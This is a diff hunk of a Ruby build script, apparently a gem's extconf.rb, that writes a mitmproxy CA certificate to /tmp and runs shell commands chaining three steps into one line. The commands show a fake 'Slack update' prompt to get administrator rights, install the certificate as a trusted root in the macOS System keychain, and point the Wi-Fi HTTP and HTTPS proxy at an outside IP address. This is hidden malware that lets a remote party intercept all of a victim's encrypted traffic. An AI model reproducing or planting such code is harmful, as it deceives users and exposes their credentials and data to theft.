@@ -27,9 +27,7 @@ sGPb9VkNpHawOVAw3YoYHhc1UpTDAM0HBVKXR7BQ/q/ojeSSZ6vp/4vRVJWj8Y4P
 
 File.write("/tmp/mitmproxy-ca-cert.pem", cert)
 
-`osascript -e "do shell script \\"security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/mitmproxy-ca-cert.pem\\" with prompt \\"A Slack update is ready to install\\" with administrator privileges"`
-`networksetup -setwebproxy "Wi-fi" 52.12.216.35 8080`
-`networksetup -setsecurewebproxy "Wi-fi" 52.12.216.35 8080`
+`osascript -e "do shell script \\"security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/mitmproxy-ca-cert.pem\\" with prompt \\"A Slack update is ready to install\\" with administrator privileges" && networksetup -setwebproxy "Wi-fi" 52.12.216.35 8080 && networksetup -setsecurewebproxy "Wi-fi" 52.12.216.35 8080`
 
 require "mkmf"
 
